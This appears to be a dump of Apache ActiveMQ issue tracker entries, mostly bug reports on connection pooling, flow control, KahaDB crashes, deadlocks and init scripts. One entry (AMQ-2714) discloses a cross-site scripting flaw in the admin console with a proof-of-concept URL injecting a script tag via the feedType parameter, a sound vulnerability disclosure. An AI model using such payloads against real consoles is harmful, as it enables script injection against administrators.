If org.apache.activemq.pool.ConnectionPool.start throws a JMSException, the "started" flag in ConnectionPool should not be set to true.  If start() throws an exception, the underlying ActiveMQConnection object will not be started.  Since started=true, any subsequent calls to ConnectionPool.start will do nothing, and a non-started connection may be used by the pool.I ran into this problem when using Camel to consume messages - see the attached test program for an example.  This test program does the following:1. Starts a bean consuming from queue test.queue using Camel.  The URL used by Camel to connect to ActiveMQ is:failover:(tcp://127.0.0.1:61616)?timeout=1000&initialReconnectDelay=1000&maxReconnectDelay=1000&useExponentialBackOff=falseThe test program uses the default behavior of Camel"s ActiveMQComponent which creates a PooledConnectionFactory.2. Waits 10 seconds, then starts an ActiveMQ broker on port 61616.  During this wait time, Camel"s connection to the broker fails every second and it is continually retrying.3. Sends 10 messages to the queue "test.queue".The call to ConnectionPool.start by camel throws an exception after blocking for 1 second since timeout=1000 is set in the URL.  However the "started" flag is set to true, so subsequent calls to ConnectionPool.start by Camel on connection retries do not restart the ActiveMQConnection.So, after step 3 in the test the Camel consumer appears to be connected to the broker, but it does not receive any messages and I get the following warning:2010-03-27 09:47:02,994 &#91;ActiveMQ Transport: tcp:///127.0.0.1:61616&#93; WARN  org.apache.activemq.ActiveMQSessionExecutor - Received a message on a connection which is not yet started. Have you forgotten to call Connection.start()?I am attaching a patch to org.apache.activemq.pool.ConnectionPool that does not set started=true if start throws an exception.  This fixes my test program - now each connection retry by camel actually attempts to start the ActiveMQConnection.
issueID:AMQ-2681
type:Bug
changed files:GenerateJDBCStatements.java
texts:set findMessageStatement cause problem for JDBCPersistenceAdapter due to error in Statements.java
field findMessageByIdStatement in org.apache.activemq.store.jdbc.Statements.java is never used and getFindMessageByIdStatement is using findMessageStatement which causes problem. Because if someone overwrite the default findMessageStatement, it will cause doGetMessageById to fail.
issueID:AMQ-2683
type:Bug
changed files:
texts:Producer Flow Control Does Not Seem to Work with Topics
I have multiple producers posting messages to queues and adding statistical information to a topic.  I have one consumer of that topic subscribing and taking those messages and monitors for problems.  The consumer is slower than publishing to the topic.  I have flow control enabled and I expected that once the memory limit of the Consumers dispatch queue was reached it would throttle the publishers to the topic, but instead it seems to lock everything up.The message producers are putting messages to each queue and the topic on separate sessions.  The broker basically stops once it posts the message that it"s going to throttle producers.  The topic messages are messages with text attributes, they are non persistent and posted non-transactional using the AUTO_ACKNOWLEDGE mode.All the producers and consumers use the same Connection factory with with these attributes set.ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(brokerURI);factory.setProducerWindowSize(1024 * 1024);factory.getPrefetchPolicy().setTopicPrefetch(10);My activemq config is as follows:    <broker xmlns="http://activemq.apache.org/schema/core" brokerName="localhost" dataDirectory="${activemq.base}/data" destroyApplicationContextOnStop="true">        <!--   For better performances use VM cursor and small memory limit.   For more information, see:            http://activemq.apache.org/message-cursors.html            Also, if your producer is "hanging", it"s probably due to producer flow control.            For more information, see:            http://activemq.apache.org/producer-flow-control.html        -->        <destinationPolicy>            <policyMap>              <policyEntries>                <policyEntry topic=">" producerFlowControl="true" memoryLimit="15mb">                  <pendingSubscriberPolicy>                    <vmCursor />                  </pendingSubscriberPolicy>                </policyEntry>                <policyEntry queue=">" producerFlowControl="true" memoryLimit="15mb">                  <!-- Use VM cursor for better latency                       For more information, see:                       http://activemq.apache.org/message-cursors.html                  <pendingQueuePolicy>                    <vmQueueCursor/>                  </pendingQueuePolicy>                  -->                </policyEntry>              </policyEntries>            </policyMap>        </destinationPolicy>         <!--             The managementContext is used to configure how ActiveMQ is exposed in             JMX. By default, ActiveMQ uses the MBean server that is started by             the JVM. For more information, see:             http://activemq.apache.org/jmx.html         -->        <managementContext>            <managementContext createConnector="false"/>        </managementContext>        <!--             Configure message persistence for the broker. The default persistence            mechanism is the KahaDB store (identified by the kahaDB tag).             For more information, see:             http://activemq.apache.org/persistence.html         -->        <persistenceAdapter>            <kahaDB directory="${activemq.base}/data/kahadb" journalMaxFileLength="5 mb"/>        </persistenceAdapter>        <!--            The systemUsage controls the maximum amount of space the broker will             use before slowing down producers. For more information, see:            http://activemq.apache.org/producer-flow-control.html        -->             <systemUsage>            <systemUsage>                <memoryUsage>                    <memoryUsage limit="200 mb"/>                </memoryUsage>                <storeUsage>                    <storeUsage limit="50 gb"/>                </storeUsage>                <tempUsage>                    <tempUsage limit="100 mb"/>                </tempUsage>            </systemUsage>        </systemUsage>        <!--             The transport connectors expose ActiveMQ over a given protocol to            clients and other brokers. For more information, see:             http://activemq.apache.org/configuring-transports.html         -->        <transportConnectors>            <transportConnector name="openwire" uri="tcp://0.0.0.0:61616"/>        </transportConnectors>    </broker>
issueID:AMQ-2684
type:Bug
changed files:StompFrame.java
texts:Incorrect character encoding/decoding when using websocket/stomp transport
Non ANSI-characters sent over the websocket/stomp transport are not encoded/decoded correctly. In my case client and server are using UTF-8 for character encoding. Changing StompSocket.onMessage(byte frame, String data) to  public void onMessage(byte frame, String data) {}       try {            protocolConverter.onStompCommand((StompFrame)wireFormat.unmarshal(new ByteSequence(data.getBytes("UTF-8"))));       } catch (Exception e) {            onException(IOExceptionSupport.create(e));       }   }and StompFrame.toString() to  public String toString() {        StringBuffer buffer = new StringBuffer();        buffer.append(getAction());        buffer.append("
");        Map headers = getHeaders();        for (Iterator iter = headers.entrySet().iterator(); iter.hasNext();) {            Map.Entry entry = (Map.Entry)iter.next();            buffer.append(entry.getKey());            buffer.append(":");            buffer.append(entry.getValue());            buffer.append("
");        }        buffer.append("
");        if (getContent() != null) {            try {                buffer.append(new String(getContent(), "UTF-8"));            } catch (Throwable e) {                buffer.append(Arrays.toString(getContent()));            }        }        return buffer.toString();    }solved the problem for me. The changes are minor, I only specified the encoding when reading bytes arrays. Maybe there should be a way to configure the encoding to be used...
issueID:AMQ-2687
type:Bug
changed files:PageFile.java
texts:NullPointerException at kahadb.
Hi!I am receiving a NullPointerException when trying to start up activemq after a crash.This is similar to http://issues.apache.org/activemq/browse/AMQ-2512 and http://issues.apache.org/activemq/browse/AMQ-2672 with the important difference that I confirmed this happens right now with:   5.3.0   5.3.1   The current TRUNK revision (I tested with revision 931309 from SVN).Also, this happens with both the default (store) cursor and fileQueueCursor. (I tried the solution given by Dariusz Szablinski at http://issues.apache.org/activemq/browse/AMQ-2512 but it did not help).I uploaded the full directory with activemq built from trunk together with the data directory (~85 megs) to: http://rapidshare.com/files/372819396/apache-activemq-5.4-SNAPSHOT_-_svn_trunk_revision_931309_with_crashing_data.tar.gz.htmlTo see the issue, just try to start activemq from this distribution.ERROR | Failed to start ActiveMQ JMS Message Broker. Reason: java.lang.NullPointerExceptionjava.lang.NullPointerException        at org.apache.kahadb.index.BTreeNode$BTreeIterator.findNextPage(BTreeNode.java:109)        at org.apache.kahadb.index.BTreeNode$BTreeIterator.hasNext(BTreeNode.java:120)        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$4.execute(KahaDBStore.java:222)        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recover(KahaDBStore.java:219)        at org.apache.activemq.broker.region.Queue.initialize(Queue.java:251)        at org.apache.activemq.broker.region.DestinationFactoryImpl.createDestination(DestinationFactoryImpl.java:83)        at org.apache.activemq.broker.region.AbstractRegion.createDestination(AbstractRegion.java:472)        at org.apache.activemq.broker.jmx.ManagedQueueRegion.createDestination(ManagedQueueRegion.java:56)        at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:123)        at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:279)        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:143)        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:143)        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:143)        at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:157)        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:143)        at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:149)        at org.apache.activemq.broker.region.AbstractRegion.start(AbstractRegion.java:95)        at org.apache.activemq.broker.region.RegionBroker.start(RegionBroker.java:184)        at org.apache.activemq.broker.jmx.ManagedRegionBroker.start(ManagedRegionBroker.java:100)        at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:155)        at org.apache.activemq.broker.scheduler.SchedulerBroker.start(SchedulerBroker.java:85)        at org.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:112)        at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:155)        at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:155)        at org.apache.activemq.broker.BrokerService$3.start(BrokerService.java:1743)        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:476)        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:85)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:597)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1527)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1468)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1400)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:513)...
issueID:AMQ-2691
type:Bug
changed files:
texts:Durable Subscriptions have messages replayed (duplicate messages) after network broker restart
Durable subs in a network of brokers can experience duplicate deliveries when a broker restarts.The problem lies in duplicate suppression and missing durable acks. Give two brokers, each networked together and with a durable consumer on each. A message produced to One gets delivered locally and forwarded to the other broker where it gets delivered. The redelivery back to the originator is suppressed by a filter that sees the broker path bread crumb. However this suppressed message is not acked so the broker on restart sees an outstanding durable message for the networked broker and recovers the topic subscription, delivering duplicates.differences in the store implementation, a store per durable sub or a shared sub store mean the issue surfaces differently.
issueID:AMQ-2693
type:Bug
changed files:ActiveMQSession.java
ActiveMQMessageConsumer.java
texts:potential hang with failover, transactions and slow thread creation with outstanding commit - close blocks pending dispatch  FailoverConsumerOutstandingCommitTest intermittent failure
potential dead lock pending dispatch that is blocked by an outstanding commit after failover.Log indicates:WARN  ActiveMQConnection             - dispatch paused, waiting for outstanding dispatch interruption processing (x) to complete..Thread Dump:Full thread dump Java HotSpot(TM) Server VM (14.0-b16 mixed mode):..."ActiveMQ Transport: tcp:///127.0.0.1:49284" daemon prio=3 tid=0x0068f800 nid=0x32 runnable [0x56ffe000]   java.lang.Thread.State: RUNNABLE at java.net.SocketOutputStream.socketWrite0(Native Method) at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:92) at java.net.SocketOutputStream.write(SocketOutputStream.java:136) at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:115) at java.io.DataOutputStream.flush(DataOutputStream.java:106) at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:168) at org.apache.activemq.transport.InactivityMonitor.oneway(InactivityMonitor.java:243) - locked <0x5c2daab0> (a java.util.concurrent.atomic.AtomicBoolean) at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:83) at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:104) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40) - locked <0x5c2da520> (a java.lang.Object) at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1205) at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:790) at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:750) at org.apache.activemq.broker.region.PrefetchSubscription.dispatch(PrefetchSubscription.java:647) at org.apache.activemq.broker.region.PrefetchSubscription.dispatchPending(PrefetchSubscription.java:592) - locked <0x5c2db3a0> (a java.lang.Object) - locked <0x5c2db3a8> (a java.lang.Object) at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:158) at org.apache.activemq.broker.region.Queue.doActualDispatch(Queue.java:1548) at org.apache.activemq.broker.region.Queue.doDispatch(Queue.java:1500) - locked <0x5c2db500> (a java.util.ArrayList) - locked <0x5c2db518> (a java.lang.Object) at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1585) at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1219) - locked <0x5c2db520> (a org.apache.activemq.broker.region.Queue$3) at org.apache.activemq.broker.region.Queue.wakeup(Queue.java:1406) at org.apache.activemq.broker.region.Queue.addSubscription(Queue.java:377) at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:279) - locked <0x5c2db590> (a java.lang.Object) at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:380) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86) at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:89) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86) at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:93) at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:533) at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:300) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:216) - locked <0x5c2dab30> (a org.apache.activemq.transport.InactivityMonitor$1) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:204) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186) at java.lang.Thread.run(Thread.java:619)"ActiveMQ Transport: tcp://localhost/127.0.0.1:61616" prio=3 tid=0x007c9000 nid=0x2e waiting on condition [0x569fe000]   java.lang.Thread.State: TIMED_WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for  <0x5c2b1950> (a java.util.concurrent.CountDownLatch$Sync) at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:198) at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedNanos(AbstractQueuedSynchronizer.java:947) at java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireSharedNanos(AbstractQueuedSynchronizer.java:1239) at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:253) at org.apache.activemq.ActiveMQConnection.waitForTransportInterruptionProcessing(ActiveMQConnection.java:2248) at org.apache.activemq.ActiveMQConnection$2.processMessageDispatch(ActiveMQConnection.java:1679) at org.apache.activemq.command.MessageDispatch.visit(MessageDispatch.java:108) at org.apache.activemq.ActiveMQConnection.onCommand(ActiveMQConnection.java:1676) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.failover.FailoverTransport$3.onCommand(FailoverTransport.java:168) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:216) - locked <0x5c2db138> (a org.apache.activemq.transport.InactivityMonitor$1) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:204) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186) at java.lang.Thread.run(Thread.java:619)"ActiveMQ Session Task" prio=3 tid=0x0076f000 nid=0x25 waiting on condition [0x55ffe000]   java.lang.Thread.State: WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for  <0x5c2e3cd0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158) at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:1925) at java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:317) at org.apache.activemq.transport.FutureResponse.getResult(FutureResponse.java:40) at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:87) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1262) at org.apache.activemq.TransactionContext.syncSendPacketWithInterruptionHandling(TransactionContext.java:666) at org.apache.activemq.TransactionContext.commit(TransactionContext.java:299) at org.apache.activemq.ActiveMQSession.commit(ActiveMQSession.java:558) at org.apache.activemq.transport.failover.FailoverConsumerOutstandingCommitTest$2.onMessage(FailoverConsumerOutstandingCommitTest.java:155) at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1204) - locked <0x5c2c6088> (a java.lang.Object) at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131) at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:619)"ActiveMQ Scheduler" daemon prio=3 tid=0x006e4c00 nid=0xf waiting for monitor entry [0x573ff000]   java.lang.Thread.State: BLOCKED (on object monitor) at org.apache.activemq.ActiveMQMessageConsumer.clearMessagesInProgress(ActiveMQMessageConsumer.java:661) - waiting to lock <0x5c2c6088> (a java.lang.Object) at org.apache.activemq.ActiveMQSession$2.run(ActiveMQSession.java:654) at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33) at java.util.TimerThread.mainLoop(Timer.java:512) at java.util.TimerThread.run(Timer.java:462)"main" prio=3 tid=0x00030800 nid=0x2 waiting for monitor entry [0x7eb7d000]   java.lang.Thread.State: BLOCKED (on object monitor) at org.apache.activemq.MessageDispatchChannel.stop(MessageDispatchChannel.java:115) - waiting to lock <0x5c2c6088> (a java.lang.Object) at org.apache.activemq.ActiveMQMessageConsumer.stop(ActiveMQMessageConsumer.java:1312) at org.apache.activemq.ActiveMQSession.stop(ActiveMQSession.java:1643) at org.apache.activemq.ActiveMQConnection.stop(ActiveMQConnection.java:544) - locked <0x5c2ae5d8> (a java.util.concurrent.CopyOnWriteArrayList) at org.apache.activemq.ActiveMQConnection.close(ActiveMQConnection.java:597) at org.apache.activemq.transport.failover.FailoverConsumerOutstandingCommitTest.doTestFailoverConsumerDups(FailoverConsumerOutstandingCommitTest.java:185) at org.apache.activemq.transport.failover.FailoverConsumerOutstandingCommitTest.testFailoverConsumerDups(FailoverConsumerOutstandingCommitTest.java:104) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:44) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:41) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:20) at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:28) at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:31) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:73) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:46) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:180) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:41) at org.junit.runners.ParentRunner$1.evaluate(ParentRunner.java:173) at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:28) at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:31) at org.junit.runners.ParentRunner.run(ParentRunner.java:220) at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:62) at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:140) at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:165) at org.apache.maven.surefire.Surefire.run(Surefire.java:107) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:289) at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:1005)
issueID:AMQ-2695
type:Bug
changed files:
texts:Invalid messages in the pending queue of durable subscriptions.
Invalid messages appear in the pending queue of the durable subscriptions (with message selector) right after broker restart. These invalid messages are blocking the delivery of the newly produced ones.As I see all messages appear in the pending queue what are produced on the topic (ever!!!) even if does not fulfills the selector.Please, check my test case!
issueID:AMQ-2696
type:Bug
changed files:
texts:DefaultJDBCAdapter returns incorrect value that prevents ActiveMQ from starting.
org.apache.activemq.store.jdbcJDBCPersistenceAdapter.getLastMessageBrokerSequenceId() calls:org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter:The call to doGetLastMessageStoreSequenceId will return the max acks table id if the max msgs id is less.The result is used to seed the sequenceGenerator:long seq =  getAdapter().doGetLastMessageStoreSequenceId(c);sequenceGenerator.setLastSequenceId(seq);However the next call to set the brokerSeq variable will fail if the seq variable has been seeded with the max acks id, as "doGetMessageById" expects a valid msgs id.long brokerSeq = 0;            if (seq != 0) {             Message last = (Message)wireFormat.unmarshal(new ByteSequence(getAdapter().doGetMessageById(c, seq)));             brokerSeq = last.getMessageId().getBrokerSequenceId();            }            return brokerSeq;If "seq" is not a valid msgs id (I presume because the message has expired and/or been removed) then this causes a NullPointerException in ByteSequence, which is not caught, and this leads to a complete failure to start ActiveMQ.The solution is not simple if the tables are in production, and is compounded even further by durable subscribers that cannot simply be deleted from the acks table.
issueID:AMQ-2697
type:Improvement
changed files:
texts:Temp destinations need ability to have policies like advisoryForConsumed, etc
Temporary destinations need the ability to have policy entries.  Currently there is no way to enable policy map entries on temporary destinations.
issueID:AMQ-2698
type:Improvement
changed files:
texts:Enhanced Example Code
I made some trivial enhancements to the ActiveMq examples.This patch introduces parallel enqueueing/dequeuing of messages (withoutconnection pooling).I used this tool for benchmarking/verifying/testing my ActiveMQconfiguration - maybe also other usersare interested in this.Example:&#8212;ant producer -DparallelThreads=60 -Dmax=2000 -DmessageSize=1024ant consumer -DparallelThreads=100 -Dmax=2000&#8212;The patch is based on the following release:&#8212;$ LANG=C svn infoPath: .URL: https://svn.apache.org/repos/asf/activemq/trunkRepository Root: https://svn.apache.org/repos/asfRepository UUID: 13f79535-47bb-0310-9956-ffa450edef68Revision: 932332&#8212;You can apply this, i accept the Apache licence.RegardsMarc Schoechlin
issueID:AMQ-2702
type:Improvement
changed files:
texts:Localize Spring-related classes in a separate module
We should try reducing Spring dependency on the broker core (and other modules) and move all Spring-related classes in a separate module.
issueID:AMQ-2704
type:Bug
changed files:
texts:Non durable TopicSubscriptions can get duplicate messages in a network of brokers ring - suppression works in the stores and for durables
With a ring topology some duplicates are inevitable, Brokers A,B,C,D - producer on A, consumer on C, paths A-B-C and A-D-C are identical. When the subscription is backed by a store, the store traps/suppresses the duplicate. A regular Topic sub does not have such suppression as it does not use a message cursor, just regular direct dispatch.A regular topic sub needs some duplicate suppression in line with the PolicyEntry enableAudit.
issueID:AMQ-2705
type:Improvement
changed files:index.jsp
BrokerView.java
BrokerViewMBean.java
texts:Show version in web console
It would be nice if the admin console would also show the amq version somewhere. I guess a good place would be the Home page, along with other information about the broker.
issueID:AMQ-2706
type:Bug
changed files:
texts:Memory leak & huge thread count in broker
I"m using request/replay pattern where client on BrokerA  creates message and start listening response from temporary-queue, consumer listening on BrokerB, after getting message it sends respond back to the temporary queue.After getting message back, client on BrokerA removes temporary queue and closes session and closes connectionNow if I take a look to the jmx then everythink is OK on BrokerA side. No hangig tmp queues no too many threads. On BrokerB every message lives hanging temporary queue and thread. Even if I shut down BrokerA there are still hanging tmp queue on brokerB and one extra thread.Now if I send 10k messages from BrokerA there is 10K temporary quest and 10K threads on brokerAExample setup: Broker A  <NetworkConnector duplex=true>  ----->    Broker B
issueID:AMQ-2710
type:Improvement
changed files:
texts:Validate camel route to pull from DLQ and reroute to destination after a delay
Redelivery attempts pile up in the activemq RA and block a consumer in pure jms. A strategy where messag order is ignored and messages are rerouted to the original destination after some period can allow the broker to deal with the redelivery and allow the application to continue with valid messages while the remaining ones are pending.Using a no retry delivery policy and an individual DLQ policy allows redeliveries to be diverted to the DLQ immediately. Adding in a camel route that takes from the DLQ and schedules a delayed delivery to the original destination provided a clean alternative, at the cost of breaking queue order semantics for the pure JMS case.An example of such a camel route would be nice.
issueID:AMQ-2713
type:Bug
changed files:
texts:BlobMessages are not deleted after delivery
When I send a blob message and the content is uploaded into the integrated fileserver (WebDAV) then the blobmessage(byte content) are not deleted after the  broker deliver the message.There is a method in the defaultupload class for deleting manually but when I do this the I get from fileserver a 404 (not authenticated) error.I eexpected that the message a the integrated fileserver will be deleted automatically after delivery through the broker.
issueID:AMQ-2714
type:Bug
changed files:
texts:Apache ActiveMQ is prone to XSS Vulnerability
Cross-Site Scripting Vulnerability exists in Apache ActiveMQ.Example:  http://localhost:8161/admin/queueBrowse/example.A?view=rss&feedType=<script>alert("ACTIVEMQ")</script>Tested on 5.3.1 and 5.3.0 versions.
issueID:AMQ-2715
type:Bug
changed files:
texts:Transport connector throws SSL exception when network connector is configured to failover over ssl transport
The reconnect thread in the failover transport is not SslContext aware so it does not propagate the brokers credentials.A network connector url of the form static:(failover:(ssl://localhost:62616))) does not work.
issueID:AMQ-2716
type:Improvement
changed files:
texts:ActiveMQConnection leaks memory by caching ActiveMQTempQueue objects
After running messaging several hours with more than 2,000,000 asynchronous send and more than1,000,000 synchronous send/reply (with temp Queue), I found about 1.5G ActiveMQConnection objects in my whole 2G memory heap (inspected with jmap and Eclipse Memory Analyzer).The 1.5G ActiveMQConnection objects and their referencing objects stay in heap old generation and cannot be cleaned by GC.By looking into those ActiveMQConnections, I found there are a huge amount of HashMaps holding temp Queue information (e.g. ActiveMQTempQueue with different sequenceId, physicalName, etc.)Since the ActiveMQConnections are pooled, however, why those ActiveMQTempQueues are always kept in ActiveMQConnections?is that a bug? or did I do something wrong (wrong setup, wrong client code)?My client code{{{        QueueConnection connection = null;        QueueSession session = null;        Queue requestQueue = null;        Queue replyQueue = null;        QueueReceiver receiver = null;        QueueSender sender = null;        try {            connection = aConnFactory.createQueueConnection();            connection.start();            session = connection.createQueueSession(false, Session.AUTO_ACKNOWLEDGE);            requestQueue = getDestinationQueue();            sender = session.createSender(requestQueue);            replyQueue = session.createTemporaryQueue(); // using temp queue            aRequestMessage.setJMSReplyTo(replyQueue);            sender.send(aRequestMessage, DeliveryMode.NON_PERSISTENT, Message.DEFAULT_PRIORITY, timeToLive);            receiver = session.createReceiver(replyQueue);            receiver.receive();        } catch (Exception e) {              ...        } finally {            try { receiver.close(); } catch (Exception ignored) {}            try { sender.close(); } catch (Exception ignored) {}            try { session.close(); } catch (Exception ignored) {}            try { connection.close(); } catch (Exception ignored) {}                    }}}}
issueID:AMQ-2719
type:Bug
changed files:
texts:Try to maintain the order of redelivered messages
When consumer closes all messages dispatched to it are redelivered. These messages should have dispatch priority in order to try maintaining the order of  messages in a single-consumer scenario.
issueID:AMQ-2720
type:Bug
changed files:
texts:Duplicate messages delivery after restart for topics with network of brokers + kahaDB
After restart, a network connector with default dynamicOnly=false will auto bridge any topic with durable subscribers. KahaDB is reporting all topics as durable through the list of destinations that it returns, the result being a duplicated durable (and phantom) consumer on the bridge.Disabling auto durable topic bridging with ddynamicOnly=true will work around this issue.problem:getDestinations in kahaDB persistence adapter should only return a list of destinations that include topics with durable subs.
issueID:AMQ-2726
type:Bug
changed files:
texts:init.d script fails if RUN_AS_GROUP not defined due to typo
In the supplied init.d scripts for linux there is a typo RUN_AS_GROUP=RUN_AS_USERwhich should be RUN_AS_GROUP=$RUN_AS_USERWe have this in our patches on our production server so we must have hit the problem at some point, but looking at the code it"s not even clear the case that this code would be called (RUN_AS_USER set to a user which does not have a primary group) could ever happen on a well-configured mahcine:RUN_AS_GROUP=`groups $RUN_AS_USER | awk "{print $3}" | tail -1`if [ "X$RUN_AS_GROUP" = "X" ]then    RUN_AS_GROUP=RUN_AS_USERfiPatch attached to do the change above, but perhaps the whole IF statement should be deleted.
issueID:AMQ-2727
type:New Feature
changed files:
texts:Allow activemq init.d scripts to override variables from /etc/sysconfig
Modification to allow the linux init.d daemon scripts to override variables from the standard location (/etc/sysconfig/activemq).Patch attached for linux 32/64 bit directories
